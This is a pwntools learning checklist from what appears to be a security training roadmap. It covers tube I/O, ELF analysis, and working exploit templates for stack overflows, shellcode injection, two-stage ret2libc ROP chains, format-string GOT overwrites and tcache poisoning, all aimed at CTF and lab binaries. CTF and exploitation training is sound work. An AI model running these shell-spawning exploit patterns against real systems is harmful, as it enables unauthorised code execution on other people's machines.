# 🐍 pwntools: Complete Mastery Checklist

> **What is pwntools?** pwntools is a Python library purpose-built for binary exploitation and CTF challenges. It provides utilities for every stage of exploit development: interacting with local processes and remote sockets (pwnlib.tubes), working with binary formats (ELF parsing, GOT/PLT navigation), packing/unpacking integers, building ROP chains, shellcode generation, and heap analysis utilities. It transforms exploit development from low-level scripting to clean, readable Python.
>
> **Why does it exist?** Writing exploit code without pwntools means manually handling socket I/O, byte packing, offsets, and ELF structure parsing — error-prone and slow. pwntools abstracts these operations into a clean API, letting you focus on the vulnerability mechanics rather than infrastructure code. It is the standard tool for binary exploitation in CTF competitions and professional penetration testing.
>
> **When to use it:** Any binary exploitation scenario — buffer overflows, format string vulnerabilities, heap exploitation (tcache poisoning, fastbin corruption, UAF), ROP chain construction, shellcode delivery, and interaction with remote exploitation services. Also useful for scripting interaction with network services for fuzzing.
>
> **When to avoid it:** For web application exploitation, use Burp Suite. For network-level exploitation, use Metasploit or raw Scapy. pwntools is specifically for binary/memory exploitation of native code (C/C++ programs).
>
> **What mastering pwntools unlocks:** Binary exploitation proficiency (the Phase 7 exit gate), ability to write and automate exploits for real CVEs, CTF competition competency, and the skills required for vulnerability research and offensive security engineering roles.
>
> **Roadmap Stage / Module:** Stage 5: Module 27 (Offensive Dev) & Shelf: Module S06 (Modern Exploitation)

---

## 🧭 Navigation

> [🏠 Master Roadmap](../README.md) · [🔧 Tools Index](README.md)

| Binary Exploitation | Debugging | Static Analysis | Forensics |
|:-------------------|:---------|:----------------|:---------|
| **🐍 pwntools** (you are here) | [🐛 GDB](GDB.md) | [🔭 Ghidra](Ghidra.md) | [🔬 Autopsy](Autopsy.md) |
| | [🐛 x64dbg](x64dbg.md) | | [🖼️ FTK Imager](FTK_Imager.md) |

---

## 📊 Progress Overview

| Phase | Focus | Tasks | Est. Time |
|:---:|:---|:---:|:---:|
| 1 | Installation & Basic Tube Usage | 6 | 2–3 hours |
| 2 | ELF Analysis & Binary Introspection | 7 | 3–4 hours |
| 3 | Buffer Overflow Exploitation | 8 | 5–7 hours |
| 4 | ROP Chain Construction | 8 | 6–8 hours |
| 5 | Format String Exploitation | 6 | 4–6 hours |
| 6 | Heap Exploitation Primitives | 7 | 6–8 hours |
| 7 | Practical Labs | 4 | 6–10 hours |
| | **Total** | **46** | **~32–46 hours** |

**Prerequisites:** Phase 7 Part 28 Stage 1 complete (GDB/pwndbg basics, x86-64 assembly fundamentals). Comfortable with Python. Understanding of memory layout (stack, heap, BSS, .text), calling conventions, and basic buffer overflow concept.

---

# PHASE 1: INSTALLATION & BASIC TUBE USAGE

---

## 1.1 Installation

```bash
# Install pwntools
pip3 install pwntools

# Install additional utilities pwntools uses
sudo apt install gdb gcc nasm

# Install pwndbg (GDB plugin — critical for pwntools workflow)
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# Verify
python3 -c "import pwn; pwn.log.info('pwntools OK')"
```

## 1.2 The `tube` Abstraction — Process & Socket I/O

Everything in pwntools is a "tube" — an abstraction over a communication channel (local process, remote TCP socket, serial port, SSH session). The same methods work on all tube types.

```python
from pwn import *

# Local process
p = process('./vulnerable_binary')

# Remote TCP connection
r = remote('ctf.example.com', 1337)

# SSH session
s = ssh('user', 'server.com', password='pass')
sh = s.process('/bin/sh')

# Core tube methods (same API for all tube types):
p.recv(100)              # Receive up to 100 bytes
p.recvuntil(b'> ')       # Receive until we see '> '
p.recvline()             # Receive one line
p.recvall()              # Receive everything until EOF

p.send(b'AAAA')          # Send bytes
p.sendline(b'AAAA')      # Send bytes + newline
p.sendafter(b'> ', b'payload')   # Wait for prompt then send

p.interactive()          # Hand over control to keyboard (drop into shell)

p.close()
```

## 1.3 Context Configuration

```python
from pwn import *

# Set architecture context (affects packing, shellcode, etc.)
context.arch = 'amd64'    # x86-64 (most common)
context.arch = 'i386'     # 32-bit x86
context.arch = 'arm'      # ARM 32-bit
context.arch = 'aarch64'  # ARM 64-bit

# Set OS
context.os = 'linux'
context.os = 'windows'

# Set endianness (usually auto-detected)
context.endian = 'little'   # x86/ARM default
context.endian = 'big'      # Network byte order, MIPS, PowerPC

# Enable logging
context.log_level = 'debug'   # Show all sends/receives (great for debugging)
context.log_level = 'info'    # Normal
context.log_level = 'error'   # Quiet

# One-liner context setup
context(arch='amd64', os='linux', log_level='debug')
```

---

# PHASE 2: ELF ANALYSIS & BINARY INTROSPECTION

---

## 2.1 ELF Object — Binary Analysis

```python
from pwn import *

# Load an ELF binary
elf = ELF('./vulnerable_binary')

# Print binary information
print(elf.checksec())      # Security protections (NX, PIE, RELRO, Stack canary)

# Get addresses
print(hex(elf.sym['main']))        # Address of main()
print(hex(elf.plt['puts']))        # PLT entry for puts (used in ret2plt)
print(hex(elf.got['puts']))        # GOT entry for puts (contains libc address)
print(hex(elf.sym['win']))         # Address of any function

# Find strings in binary
print(list(elf.search(b'/bin/sh')))  # Search for /bin/sh string
print(list(elf.search(b'cat flag'))) # Search for any string

# Get binary base (for PIE binaries — the rebased address)
print(hex(elf.address))

# Rebase ELF if PIE (after leaking the base address at runtime)
elf.address = leaked_base_address
print(hex(elf.sym['win']))  # Now returns the correct runtime address
```

## 2.2 Security Protections — checksec

```python
# pwntools checksec output explained:
# RELRO:    Full RELRO   → GOT is read-only (no GOT overwrite)
#           Partial RELRO → GOT is writable (GOT overwrite is possible)
#           No RELRO     → No protection
# Stack:    Canary found → Stack canary present (need to leak or bypass)
#           No canary    → Direct stack smashing works
# NX:       NX enabled   → No executable stack (need ROP, not shellcode on stack)
#           NX disabled  → Can write and execute shellcode on stack
# PIE:      PIE enabled  → Base address randomized each run (need leak)
#           No PIE       → Fixed addresses (no leak needed)
# ASLR:     Controlled by OS (/proc/sys/kernel/randomize_va_space)

# Disable ASLR for local testing
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

---

# PHASE 3: BUFFER OVERFLOW EXPLOITATION

---

## 3.1 Finding the Overflow Offset

```python
from pwn import *

# Method 1: Cyclic pattern — find the exact offset
pattern = cyclic(200)        # Generate 200-byte De Bruijn sequence
print(pattern)

# Run the binary with the pattern, note the crash value (e.g., in RIP/RSP/EIP)
# Then:
crash_value = b'faab'        # What you see in the register at crash
offset = cyclic_find(crash_value)  # Find the offset
print(f"Offset: {offset}")   # e.g., 72

# Or with an integer (from GDB showing register value as hex):
offset = cyclic_find(0x6261616b)
```

## 3.2 Basic Stack Buffer Overflow

```python
from pwn import *

elf = ELF('./bof')
context.binary = elf

# Scenario: 64-bit binary, No PIE, No canary, NX disabled (can use shellcode)
# Target: overflow RIP to call win()

offset = 72                     # From cyclic_find
win_addr = elf.sym['win']       # Address of win() function

payload = flat(
    b'A' * offset,              # Padding to reach RIP
    win_addr                    # Overwrite return address with win()
)

p = process('./bof')
p.sendlineafter(b'> ', payload)
p.interactive()
```

## 3.3 Shellcode Injection (NX Disabled)

```python
from pwn import *

context(arch='amd64', os='linux')
elf = ELF('./no_nx')

# Generate shellcode for /bin/sh
shellcode = asm(shellcraft.sh())    # Platform-appropriate shellcode
print(f"Shellcode length: {len(shellcode)}")

# Find the buffer address (either via leak or GDB)
buf_addr = 0x7fffffffe4f0    # Example: address of the input buffer on stack

offset = 80
payload = flat(
    shellcode,                       # Shellcode at start of buffer
    b'A' * (offset - len(shellcode)),# Padding to reach RIP
    buf_addr                         # Return to buffer (execute our shellcode)
)

p = process('./no_nx')
p.sendlineafter(b'> ', payload)
p.interactive()
```

---

# PHASE 4: ROP CHAIN CONSTRUCTION

---

ROP (Return-Oriented Programming) is the technique for bypassing NX: instead of injecting shellcode, you chain together small existing code snippets ("gadgets") ending with `ret` to perform arbitrary computation.

## 4.1 Using pwntools ROP

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # or libc from the binary's deps
rop = ROP(elf)

context.binary = elf

# Find gadgets
# pwntools automatically scans the binary for useful gadgets

# Get a specific gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
ret_gadget = rop.find_gadget(['ret'])[0]   # Stack alignment gadget

print(f"pop rdi; ret → {hex(pop_rdi)}")

# Build a ret2plt chain (call puts(puts@GOT) to leak libc address)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
main_addr = elf.sym['main']

chain = flat(
    b'A' * offset,       # Padding
    pop_rdi,             # Gadget: pop the next value into rdi
    got_puts,            # Argument: puts@GOT address (what we want to print)
    plt_puts,            # Call puts → prints 8 bytes at GOT[puts] = libc address
    main_addr            # Return to main for a second run (to send stage 2)
)
```

## 4.2 ret2libc — Full Exploitation Pattern

```python
from pwn import *

elf = ELF('./target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.binary = elf

offset = 72

# Stage 1: Leak libc address
p = process('./target')

pop_rdi = 0x401233         # pop rdi; ret (from ROPgadget or pwntools)
ret = 0x401016             # ret (for stack alignment on 64-bit)
plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
main = elf.sym['main']

stage1 = flat(
    b'A' * offset,
    pop_rdi, got_puts,     # rdi = puts@GOT
    plt_puts,              # call puts (leaks libc addr)
    main                   # loop back to main
)

p.sendlineafter(b'> ', stage1)
leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts@libc = {hex(leaked)}")

# Calculate libc base
libc.address = leaked - libc.sym['puts']
log.info(f"libc base = {hex(libc.address)}")

# Stage 2: Call system('/bin/sh')
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

stage2 = flat(
    b'A' * offset,
    ret,                   # Stack alignment (required on Ubuntu 18+)
    pop_rdi, bin_sh,       # rdi = "/bin/sh"
    system                 # call system("/bin/sh")
)

p.sendlineafter(b'> ', stage2)
p.interactive()
```

## 4.3 Automated ROP with pwntools

```python
# pwntools can build common ROP chains automatically
rop = ROP([elf, libc])

# After setting libc.address:
rop.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])

chain = flat(
    b'A' * offset,
    rop.chain()
)
```

---

# PHASE 5: FORMAT STRING EXPLOITATION

---

```python
from pwn import *

p = process('./fmtstr_vuln')

# Step 1: Leak stack values to find canary/libc/binary addresses
# Use %p to print stack values:
payload = b'AAAA ' + b'%p ' * 20
p.sendline(payload)
output = p.recvline()
# Analyze output: identify leaked addresses (canary = 8 hex bytes ending in 00)

# Step 2: Write to arbitrary memory (format string write primitive)
# %n writes the number of bytes printed so far to the address in the argument

# pwntools FmtStr helper
from pwn import FmtStr, fmtstr_payload

# Find the offset: which %p corresponds to our input on the stack?
# Use: AAAA%p%p%p... until you see 0x41414141 (0x41 = 'A')

offset = 6   # The AAAA appears as argument 6 on the stack

# Craft a write payload: write value to address
target_addr = elf.got['puts']
payload = fmtstr_payload(offset, {target_addr: system_addr})

p.sendline(payload)
```

---

# PHASE 6: HEAP EXPLOITATION PRIMITIVES

---

```python
from pwn import *

p = process('./heap_vuln')

# Heap exploitation requires understanding the allocator (glibc malloc, jemalloc, etc.)
# Key primitives for glibc tcache/fastbin exploitation:

# 1. Allocate and free chunks to set up heap state
def malloc(size, data=b''):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    if data:
        p.sendafter(b'data: ', data)

def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())

def read(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'idx: ', str(idx).encode())
    return p.recvline()

# tcache poisoning: overwrite fd pointer of freed chunk to redirect next malloc
# to an arbitrary address
malloc(0x20)   # chunk 0
malloc(0x20)   # chunk 1
free(0)        # free chunk 0 → goes to tcache[0x20]
free(1)        # free chunk 1 → goes to tcache[0x20], fd points to chunk 0

# Overwrite chunk 1's fd with target address (via UAF or heap overflow)
# Next malloc(0x20) returns chunk 1, then malloc(0x20) returns target address
```

---

# PHASE 7: PRACTICAL LABS

---

- [ ] **Lab 1 — ret2win (Week 1 Goal):** Solve pwntools ROP Emporium `ret2win` challenge (x86-64). Write a complete exploit script using pwntools: find offset with cyclic, identify win() address with ELF, build payload with flat(), get the flag. Document every step.

- [ ] **Lab 2 — ret2libc (Phase 7 Exit Gate Prep):** Solve pwntools ROP Emporium `split` or a similar ret2libc challenge. Leak a libc address, calculate base, call `system("/bin/sh")`. Write the full 2-stage exploit.

- [ ] **Lab 3 — NX Bypass with ROP Chain:** Find a binary with NX enabled but no PIE and no canary. Build a complete ROP chain using `ROPgadget` to find gadgets and pwntools to chain them. Achieve code execution without shellcode on the stack.

- [ ] **Lab 4 — CTF Binary:** Solve a real CTF binary exploitation challenge from `pwnable.kr`, `CTFtime.org`, or Hack The Box. Document your analysis workflow: static analysis with Ghidra, dynamic analysis with GDB/pwndbg, exploit writing with pwntools. Write a proper writeup.

---

## 📝 Operational Notes

- **`flat()` vs `p64()` vs `pack()`:** `p64(val)` packs a single value as 8 bytes little-endian. `flat([...])` packs a list of values/bytes concatenated. `pack(val, wordsize, endian)` is the underlying function. Use `flat()` for building payloads — it handles mixed strings and integers cleanly.
- **`gdbscript` parameter:** `p = process('./vuln', gdbscript='break main\ncontinue')` launches GDB alongside the process — invaluable for debugging exploits. The GDB session runs the script automatically.
- **`pause()` function:** Add `pause()` in your script before sending the payload. This gives you time to attach GDB manually: `gdb -p $(pgrep vuln)`. Remove for final exploit.
- **Debugging hangs:** If your script hangs at `recvuntil`, the binary is waiting for different input or you've crashed it. Use `p.recv(timeout=1)` with a short timeout to recover, and `context.log_level = 'debug'` to see all I/O.
- **Stack alignment on 64-bit:** 64-bit Linux requires the stack to be 16-byte aligned before a `call` instruction. If `system()` crashes with a misaligned stack, add an extra `ret` gadget before the `system` call to realign.
